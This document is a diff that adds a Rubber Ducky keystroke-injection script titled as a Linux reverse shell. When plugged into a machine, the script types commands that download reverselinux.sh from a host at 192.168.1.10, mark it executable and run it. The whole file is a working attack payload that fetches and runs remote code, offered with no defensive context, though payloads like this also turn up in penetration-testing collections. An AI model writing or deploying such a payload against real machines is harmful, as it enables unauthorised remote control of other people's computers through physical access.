@@ -1,0 +1,10 @@
+REM Linux Reverse Shell Rubber Ducky Script
+DELAY 1000
+STRING curl -O http://192.168.1.10/reverselinux.sh
+ENTER
+DELAY 3000
+STRING chmod +x reverselinux.sh
+ENTER
+DELAY 1000
+STRING ./reverselinux.sh
+ENTER
